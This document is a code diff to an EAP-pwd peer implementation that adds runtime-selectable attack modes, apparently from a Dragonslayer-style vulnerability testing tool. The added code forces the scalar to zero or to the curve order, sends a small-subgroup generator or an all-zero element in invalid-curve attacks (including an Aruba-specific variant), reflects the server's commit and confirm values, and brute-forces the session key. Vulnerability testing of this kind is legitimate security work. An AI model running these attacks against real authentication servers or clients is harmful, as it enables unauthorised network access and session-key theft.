@@ -19,9 +19,9 @@
 
 #include "common/attacks.h"
 
-#ifdef DRAGONBLOOD
+#ifdef DRAGONSLAYER
 #include "eapol_supp/eapol_supp_sm.h"
-#endif // DRAGONBLOOD
+#endif // DRAGONSLAYER
 
 struct eap_pwd_data {
 	enum {
@@ -39,7 +39,7 @@ struct eap_pwd_data {
 	u8 prep;
 	u8 token[4];
 	EAP_PWD_group *grp;
-#ifdef DRAGONBLOOD_INVALID_CUVE
+#ifdef DRAGONSLAYER
 	struct crypto_ec *subgroup;
 	struct crypto_ec_point *subgroup_generator;
 #endif
@@ -565,22 +565,39 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 		goto fin;
 	}
 
-/** Test if a scalar equal to zero is accepted */
-#ifdef DRAGONBLOOD_INVALID_CUVE
-	if (crypto_bignum_sub(crypto_ec_get_order(data->grp->group),
-	                      data->private_value, mask) < 0 ||
-	    crypto_bignum_add(data->private_value, mask,
-			      data->my_scalar) < 0 ||
-	    crypto_bignum_mod(data->my_scalar,
-			      crypto_ec_get_order(data->grp->group),
-			      data->my_scalar) < 0) {
-		poc_log(eapol_sm_get_addr(sm->eapol_ctx),
-			   "EAP-pwd (peer): unable to force scalar to zero");
-		goto fin;
-	}
+/** Test if a scalar equal to zero or equal to the order is accepted */
+#ifdef DRAGONSLAYER
+	if (dragonslayer_invalidcurve || dragonslayer_invalidcurve_aruba)
+	{
+		if (crypto_bignum_sub(crypto_ec_get_order(data->grp->group),
+			              data->private_value, mask) < 0 ||
+		    crypto_bignum_add(data->private_value, mask,
+				      data->my_scalar) < 0 ||
+		    crypto_bignum_mod(data->my_scalar,
+				      crypto_ec_get_order(data->grp->group),
+				      data->my_scalar) < 0) {
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx),
+				   "EAP-pwd (peer): unable to force scalar to zero");
+			goto fin;
+		}
 
-	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending a scalar equal to zero\n");
-#endif // DRAGONBLOOD_INVALID_CUVE
+		if (dragonslayer_invalidcurve_aruba)
+		{
+			if (crypto_bignum_add(data->my_scalar, crypto_ec_get_order(data->grp->group),
+					      data->my_scalar) < 0) {
+				poc_log(eapol_sm_get_addr(sm->eapol_ctx),
+					   "EAP-pwd (peer): unable to force scalar to order");
+				goto fin;
+			}
+
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "setting scalar equal to order of the curve\n");
+		}
+		else if (dragonslayer_invalidcurve)
+		{
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending a scalar equal to zero\n");
+		}
+	}
+#endif // DRAGONSLAYER
 
 	if (crypto_ec_point_mul(data->grp->group, data->grp->pwe, mask,
 				data->my_element) < 0) {
@@ -699,32 +716,46 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	if (data->outbuf == NULL)
 		goto fin;
 
-/** We send the subgroup generator as our peer element */
-#ifdef DRAGONBLOOD_INVALID_CUVE
-	if (data->subgroup == NULL) {
-		data->subgroup = crypto_ec_subgroup(269, &data->subgroup_generator);
+#ifdef DRAGONSLAYER
+	/** We send the subgroup generator as our peer element */
+	if (dragonslayer_invalidcurve)
+	{
 		if (data->subgroup == NULL) {
-			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: failed to initialize subgroup parameters!\n");
+			data->subgroup = crypto_ec_subgroup(269, &data->subgroup_generator);
+			if (data->subgroup == NULL) {
+				poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: failed to initialize subgroup parameters!\n");
+				exit(1);
+			}
+		}
+
+		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, element,
+					   element + prime_len) != 0) {
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: subgroup generator assignment failed!\n");
 			exit(1);
 		}
-	}
 
-	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, element,
-				   element + prime_len) != 0) {
-		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: subgroup generator assignment failed!\n");
-		exit(1);
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending generator of small subgroup as the element\n");
 	}
-	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending generator of small subgroup as the element\n");
-#elif defined(DRAGONBLOOD_REFLECT)
-	crypto_bignum_to_bin(data->server_scalar, scalar, order_len, order_len);
-	if (crypto_ec_point_to_bin(data->grp->group, data->server_element, element,
-				   element + prime_len) != 0) {
-		wpa_printf(MSG_INFO, "EAP-PWD (peer): point assignment fail");
-		goto fin;
+	/** Send element at infinity to attack Aruba implementations */
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		// TODO: Properly handle this case when recovering the session key!!
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "sending element at infinity (= zero element)\n");
+		memset(element, 0, prime_len * 2);
 	}
+	/** Reflect the received scalar and element */
+	else if (dragonslayer_reflect)
+	{
+		crypto_bignum_to_bin(data->server_scalar, scalar, order_len, order_len);
+		if (crypto_ec_point_to_bin(data->grp->group, data->server_element, element,
+					   element + prime_len) != 0) {
+			wpa_printf(MSG_INFO, "EAP-PWD (peer): point assignment fail");
+			goto fin;
+		}
 
-	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Reflected server scalar and element in commit frame\n");
-#endif // DRAGONBLOOD_INVALID_CUVE
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Reflected server scalar and element in commit frame\n");
+	}
+#endif // DRAGONSLAYER
 
 	/* we send the element as (x,y) follwed by the scalar */
 	wpabuf_put_data(data->outbuf, element, 2 * prime_len);
@@ -744,13 +775,100 @@ fin:
 }
 
 
-#ifdef DRAGONBLOOD_INVALID_CUVE
+#ifdef DRAGONSLAYER
+
+static int
+eap_pwd_confirm_check_key(struct eap_sm *sm, struct eap_pwd_data *data, u32 cs,
+			  const u8 *secret_key, const u8 *received_confirm)
+{
+	struct crypto_hash *hash = NULL;
+	u8 conf[SHA256_MAC_LEN] = {0};
+	u8 *cruft = NULL;
+	size_t prime_len = 0, order_len = 0;
+
+	/* normal group and subgroup have the same bit-lengths */
+	prime_len = crypto_ec_prime_len(data->grp->group);
+	order_len = crypto_ec_order_len(data->grp->group);
+
+	cruft = os_malloc(prime_len * 2);
+	if (!cruft) {
+		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm allocation "
+			   "fail");
+		return -1;
+	}
+	memset(cruft, 0, prime_len * 2);
+
+	/*
+	 * server's commit is H(k | server_element | server_scalar |
+	 *			peer_element | peer_scalar | ciphersuite)
+	 */
+	hash = eap_pwd_h_init();
+	if (hash == NULL) {
+		os_free(cruft);
+		return -1;
+	}
+
+	eap_pwd_h_update(hash, secret_key, prime_len);
+
+	/* server element: x, y */
+	if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
+				   cruft, cruft + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
+			   "assignment fail");
+		//eap_pwd_h_final(hash, conf);
+		//os_free(cruft);
+		return -1;
+	}
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* server scalar */
+	crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* depending on which test is being run, we pick the correct element that was sent */
+	if (dragonslayer_invalidcurve)
+	{
+		/* my element was the generator of the subgroup */
+		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
+					   cruft + prime_len) != 0) {
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
+			eap_pwd_h_final(hash, conf);
+			os_free(cruft);
+			return -1;
+		}
+	}
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		/**
+		 * TODO: The cases where we send _the server_ a scalar equal to the order,
+		 * and an all-zero element, has never been tested. So this attack is likely
+		 * to fail even if the server is actually vulnerable...
+		 */
+		memset(cruft, 0, prime_len * 2);
+	}
+
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* my scalar */
+	crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* the ciphersuite */
+	eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
+
+	/* random function fin */
+	eap_pwd_h_final(hash, conf);
+	hash = NULL;
+	os_free(cruft);
+
+	return os_memcmp_const(conf, received_confirm, SHA256_MAC_LEN) == 0;
+}
 
 static void
-eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
-				 struct eap_method_ret *ret,
-				 const struct wpabuf *reqData,
-				 const u8 *payload, size_t payload_len)
+eap_pwd_confirm_invalidcurve(struct eap_sm *sm, struct eap_pwd_data *data,
+			     struct eap_method_ret *ret,
+			     const struct wpabuf *reqData,
+			     const u8 *payload, size_t payload_len)
 {
 	struct crypto_hash *hash = NULL;
 	u32 cs, peer_rand;
@@ -795,98 +913,75 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 
 	// ========================================== PART 1: Calculate peer confirm =================================================
 
-	struct crypto_ec_point *point_k = crypto_ec_point_init(data->subgroup);
-	struct crypto_bignum *bignum_rand = crypto_bignum_init();
-	struct crypto_bignum *k_xcoord = crypto_bignum_init();
-
-	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "trying to recover session key..\n");
-
-	peer_rand = 1;
-	while (peer_rand < 269)
+	if (dragonslayer_invalidcurve)
 	{
-		memset(cruft, 0, prime_len * 2);
+		struct crypto_ec_point *point_k = crypto_ec_point_init(data->subgroup);
+		struct crypto_bignum *bignum_rand = crypto_bignum_init();
+		struct crypto_bignum *k_xcoord = crypto_bignum_init();
 
-		/*
-		 * server's commit is H(k | server_element | server_scalar |
-		 *			peer_element | peer_scalar | ciphersuite)
-		 */
-		hash = eap_pwd_h_init();
-		if (hash == NULL)
-			goto fin;
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "trying to recover session key..\n");
 
-		/*
-		 * zero the memory each time because this is mod prime math and some
-		 * value may start with a few zeros and the previous one did not.
-		 */
+		peer_rand = 1;
+		while (peer_rand < 269)
+		{
+			memset(cruft, 0, prime_len * 2);
 
-		/* Replace the secret key k with a result from the subgroup calculation */
-		if (crypto_bignum_setint(bignum_rand, peer_rand)) {
-			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: converting peer_rand to bignum failed\n", __FUNCTION__);
-			goto fin;
+			/* Replace the secret key k with a result from the subgroup calculation */
+			if (crypto_bignum_setint(bignum_rand, peer_rand)) {
+				poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: converting peer_rand to bignum failed\n", __FUNCTION__);
+				goto fin;
+			}
+			if (crypto_ec_point_mul(data->subgroup, data->subgroup_generator, bignum_rand, point_k)) {
+				poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: point multiplication failed\n", __FUNCTION__);
+				goto fin;
+			}
+			if (crypto_ec_point_x(data->subgroup, point_k, k_xcoord)) {
+				poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to get X-coordinate of k\n", __FUNCTION__);
+				goto fin;
+			}
+			if (crypto_bignum_to_bin(k_xcoord, cruft, prime_len, prime_len) <= 0) {
+				printf("FAILED converting x-coordinate to binary\n");
+				fflush(stdout);
+			}
+
+			ptr = (u8 *) payload;
+			if (eap_pwd_confirm_check_key(sm, data, cs, cruft, ptr))
+				break;
+
+			wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm did not verify");
+			peer_rand++;
 		}
-		if (crypto_ec_point_mul(data->subgroup, data->subgroup_generator, bignum_rand, point_k)) {
-			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: point multiplication failed\n", __FUNCTION__);
-			goto fin;
-		}
-		if (crypto_ec_point_x(data->subgroup, point_k, k_xcoord)) {
-			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to get X-coordinate of k\n", __FUNCTION__);
-			goto fin;
-		}
-		crypto_bignum_to_bin(k_xcoord, cruft, prime_len, prime_len);
 
-		eap_pwd_h_update(hash, cruft, prime_len);
-
-		/* server element: x, y */
-		if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
-					   cruft, cruft + prime_len) != 0) {
-			wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
-				   "assignment fail");
-			goto fin;
-		}
-		eap_pwd_h_update(hash, cruft, prime_len * 2);
-
-		/* server scalar */
-		crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
-		eap_pwd_h_update(hash, cruft, order_len);
-
-		/* my element was the generator of the subgroup */
-		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
-					   cruft + prime_len) != 0) {
-			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
+		if (peer_rand > 269) {
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "failed to recover session key. Peer may not be vulnerable?\n");
 			goto fin;
 		}
 
-		eap_pwd_h_update(hash, cruft, prime_len * 2);
-
-		/* my scalar */
-		crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
-		eap_pwd_h_update(hash, cruft, order_len);
-
-		/* the ciphersuite */
-		eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
-
-		/* random function fin */
-		eap_pwd_h_final(hash, conf);
-		hash = NULL;
-
-		ptr = (u8 *) payload;
-		if (os_memcmp_const(conf, ptr, SHA256_MAC_LEN) == 0)
-			break;
-
-		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm did not verify");
-		peer_rand++;
+		// Set the recovered session key !!
+		data->k = k_xcoord;
 	}
+	else if (dragonslayer_invalidcurve_aruba)
+	{
+		memset(cruft, 0, prime_len);
+		
+		if (!eap_pwd_confirm_check_key(sm, data, cs, cruft, ptr)) {
+			poc_log(eapol_sm_get_addr(sm->eapol_ctx), "failed to recover session key. Try attack again.\n");
+			goto fin;
+		}
 
-	if (peer_rand > 269) {
-		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "failed to recover session key. Peer may not be vulnerable?\n");
-		goto fin;
+		// Set the recovered session key, which here is the point at infinity
+		if (data->k != NULL)
+			data->k = crypto_bignum_init();
+		crypto_bignum_setint(data->k, 0);
+	}
+	else
+	{
+		printf("dragon-slayer: internal error in %s\n", __FUNCTION__);
+		exit(1);
 	}
 
 	wpa_printf(MSG_DEBUG, "EAP-pwd (peer): confirm verified");
 	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "successfully recovered the session key. Peer is vulnerable to invalid curve attack!\n");
-
-	// Set the recovered session key !!
-	data->k = k_xcoord;
 
 	// ========================================== PART 2: Calculate our confirm =================================================
 
@@ -965,7 +1060,7 @@ fin:
 		eap_pwd_h_final(hash, conf);
 }
 
-#else
+#endif // DRAGONSLAYER
 
 static void
 eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
@@ -1063,16 +1158,18 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	hash = NULL;
 
 	ptr = (u8 *) payload;
-#ifdef DRAGONBLOOD_REFLECT
-	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Skipping verification of recieved confirm value\n");
-#else
+#ifdef DRAGONSLAYER
+	if (dragonslayer_reflect) {
+		memcpy(conf, ptr, SHA256_MAC_LEN);
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Skipping verification of recieved confirm value\n");
+	}
+#endif // DRAGONSLAYER
 	if (os_memcmp_const(conf, ptr, SHA256_MAC_LEN)) {
 		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm did not verify");
 		goto fin;
 	}
 
 	wpa_printf(MSG_DEBUG, "EAP-pwd (peer): confirm verified");
-#endif
 
 	/*
 	 * compute confirm:
@@ -1132,9 +1229,11 @@ eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	if (data->outbuf == NULL)
 		goto fin;
 
-#ifdef DRAGONBLOOD_REFLECT
-	memcpy(conf, ptr, SHA256_MAC_LEN);
-	poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Reflected confirm value in confirm frame\n");
+#ifdef DRAGONSLAYER
+	if (dragonslayer_reflect) {
+		memcpy(conf, ptr, SHA256_MAC_LEN);
+		poc_log(eapol_sm_get_addr(sm->eapol_ctx), "Reflected confirm value in confirm frame\n");
+	}
 #endif
 
 	wpabuf_put_data(data->outbuf, conf, SHA256_MAC_LEN);
@@ -1153,8 +1252,6 @@ fin:
 	if (hash)
 		eap_pwd_h_final(hash, conf);
 }
-
-#endif // DRAGONBLOOD_INVALID_CUVE
 
 
 static struct wpabuf *
@@ -1319,8 +1416,14 @@ eap_pwd_process(struct eap_sm *sm, void *priv, struct eap_method_ret *ret,
 						pos, len);
 		break;
 	case EAP_PWD_OPCODE_CONFIRM_EXCH:
-		eap_pwd_perform_confirm_exchange(sm, data, ret, reqData,
-						 pos, len);
+#ifdef DRAGONSLAYER
+		if (dragonslayer_invalidcurve || dragonslayer_invalidcurve_aruba)
+			eap_pwd_confirm_invalidcurve(sm, data, ret, reqData,
+						     pos, len);
+		else
+#endif // DRAGONSLAYER
+			eap_pwd_perform_confirm_exchange(sm, data, ret, reqData,
+							 pos, len);
 		break;
 	default:
 		wpa_printf(MSG_INFO, "EAP-pwd: Ignoring message with unknown "
